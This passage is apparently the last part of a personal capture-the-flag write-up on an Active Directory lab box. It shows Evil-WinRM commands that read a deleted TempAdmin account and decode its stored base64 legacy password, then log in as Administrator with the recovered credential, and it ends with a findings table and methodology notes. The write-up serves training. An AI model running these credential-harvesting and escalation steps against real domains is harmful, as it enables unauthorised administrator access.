*Evil-WinRM* PS C:\Users\arksvc\Documents> get-module -listavailable activedirectory


    Directory: C:\Windows\system32\WindowsPowerShell\v1.0\Modules


ModuleType Version    Name                                ExportedCommands
---------- -------    ----                                ----------------
Manifest   1.0.0.0    ActiveDirectory                     {Get-ADRootDSE, New-ADObject, Rename-ADObject, Move-ADObject...}
```

```sh
*Evil-WinRM* PS C:\Users\arksvc\Documents> get-adgroup "AD Recycle Bin" -properties *


CanonicalName                   : cascade.local/UK/Groups/AD Recycle Bin
CN                              : AD Recycle Bin
Created                         : 1/13/2020 1:18:30 AM
createTimeStamp                 : 1/13/2020 1:18:30 AM
Deleted                         :
Description                     :
DisplayName                     :
DistinguishedName               : CN=AD Recycle Bin,OU=Groups,OU=UK,DC=cascade,DC=local
dSCorePropagationData           : {1/17/2020 9:35:46 PM, 1/17/2020 9:32:57 PM, 1/17/2020 3:37:36 AM, 1/17/2020 12:14:04 AM...}
GroupCategory                   : Security
GroupScope                      : DomainLocal
groupType                       : -2147483644
HomePage                        :
instanceType                    : 4
isDeleted                       :
LastKnownParent                 :
ManagedBy                       :
member                          : {CN=ArkSvc,OU=Services,OU=Users,OU=UK,DC=cascade,DC=local}
MemberOf                        : {}
Members                         : {CN=ArkSvc,OU=Services,OU=Users,OU=UK,DC=cascade,DC=local}
Modified                        : 1/13/2020 4:38:03 PM
modifyTimeStamp                 : 1/13/2020 4:38:03 PM
Name                            : AD Recycle Bin
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  : CN=Group,CN=Schema,CN=Configuration,DC=cascade,DC=local
ObjectClass                     : group
ObjectGUID                      : dcca936c-3cf5-4234-9e41-5cb9252c292c
objectSid                       : S-1-5-21-[DOMAIN_SID_REDACTED]-1119
ProtectedFromAccidentalDeletion : False
SamAccountName                  : AD Recycle Bin
sAMAccountType                  : 536870912
sDRightsEffective               : 0
SID                             : S-1-5-21-[DOMAIN_SID_REDACTED]-1119
SIDHistory                      : {}
uSNChanged                      : 114767
uSNCreated                      : 65578
whenChanged                     : 1/13/2020 4:38:03 PM
whenCreated                     : 1/13/2020 1:18:30 AM
```

ArkSvc is the only member. the name of the group gives me an idea of what it might be for, but it doesn't actually prove what permissions have been delegated to it

initially was thinking about restoring TempAdmin. before making any changes I wanted to see if I could even read deleted objects and what information AD still had on the account

```sh
*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects -Properties *


CanonicalName                   : cascade.local/Deleted Objects
CN                              : Deleted Objects
Created                         : 1/9/2020 3:31:39 PM
createTimeStamp                 : 1/9/2020 3:31:39 PM
Deleted                         : True
Description                     : Default container for deleted objects
DisplayName                     :
DistinguishedName               : CN=Deleted Objects,DC=cascade,DC=local
dSCorePropagationData           : {1/1/1601 12:00:00 AM}
instanceType                    : 4
isCriticalSystemObject          : True
isDeleted                       : True
LastKnownParent                 :
Modified                        : 1/13/2020 1:21:17 AM
modifyTimeStamp                 : 1/13/2020 1:21:17 AM
Name                            : Deleted Objects
ObjectCategory                  : CN=Container,CN=Schema,CN=Configuration,DC=cascade,DC=local
ObjectClass                     : container
ObjectGUID                      : 51de9801-3625-4ac2-a605-d6bd71617681
ProtectedFromAccidentalDeletion :
sDRightsEffective               : 0
showInAdvancedViewOnly          : True
systemFlags                     : -1946157056
uSNChanged                      : 65585
uSNCreated                      : 5695
whenChanged                     : 1/13/2020 1:21:17 AM

<--snip-->

accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
cascadeLegacyPwd                : [BASE64_REDACTED]
CN                              : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
codePage                        : 0
countryCode                     : 0
Created                         : 1/27/2020 3:23:08 AM
createTimeStamp                 : 1/27/2020 3:23:08 AM
Deleted                         : True
Description                     :
DisplayName                     : TempAdmin
DistinguishedName               : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
dSCorePropagationData           : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM}
givenName                       : TempAdmin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=Users,OU=UK,DC=cascade,DC=local
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 1/27/2020 3:24:34 AM
modifyTimeStamp                 : 1/27/2020 3:24:34 AM
msDS-LastKnownRDN               : TempAdmin
Name                            : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059
objectSid                       : S-1-5-21-[DOMAIN_SID_REDACTED]-1136
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 132245689883479503
sAMAccountName                  : TempAdmin
sDRightsEffective               : 0
userAccountControl              : 66048
userPrincipalName               : TempAdmin@cascade.local
uSNChanged                      : 237705
uSNCreated                      : 237695
whenChanged                     : 1/27/2020 3:24:34 AM
whenCreated                     : 1/27/2020 3:23:08 AM
```

the important bit is the legacy password attribute on TempAdmin. same attribute we saw on r.thompson earlier. didn't need to restore the account after all. the deleted object still had the information I was interested in

decoded the value locally

```sh
CPTS/day10/cascade via 🐍 v3.14.10
❯ echo '[BASE64_REDACTED]' | base64 -d
[ADMIN_PASSWORD]⏎
```

the meeting notes said TempAdmin used the same password as the normal admin account. needed to test that rather than assuming it was still true

<br>

### administrator

```sh
CPTS/day10/cascade via 🐍 v3.14.10
❯ evil-winrm -i $IP -u Administrator -p [ADMIN_PASSWORD]

Evil-WinRM shell v4.1

Info: Establishing connection to remote endpoint

Info: Connection successful
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

and it worked. Administrator WinRM session without having to restore TempAdmin

<br>

---

## `06 / findings and lessons`

### systems / methods / findings

| system / object | method | finding |
| --- | --- | --- |
| DNS | record queries / AXFR | zone transfer failed, moved on to LDAP |
| LDAP | anonymous rootDSE and user enumeration | custom `cascadeLegacyPwd` attribute exposed a base64 encoded credential |
| RPC / SMB | authenticated enumeration | identified custom groups and readable shares |
| Data share | registry export and email archive | recoverable VNC password and a reference to password reuse |
| WinRM | credential validation | VNC password also worked for s.smith |
| Audit share | logon script and share enumeration | access to the audit application and its database |
| SQLite / .NET | database inspection and decompilation | encrypted LDAP credential, hardcoded key and IV |
| AD | group and deleted object enumeration | TempAdmin's legacy password attribute was still readable |
| WinRM | credential validation | Administrator accepted the recovered password |

### methodology

- dont stop at rootDSE, check what else an anonymous LDAP bind can read
- base64 is encoding, not encryption. look at the actual application if the decoded value is still encrypted
- even if a service isn't listening, its old config can still be useful
- re-enumerate shares and group memberships when switching accounts
- keep interesting bits of information from emails and old documents, might not be useful until much later
- a custom group name is a hint, not proof of its permissions
- deleted objects can still have useful attributes. check what's readable before trying to restore anything

<br>

---

<sub>nu11s3c</sub>
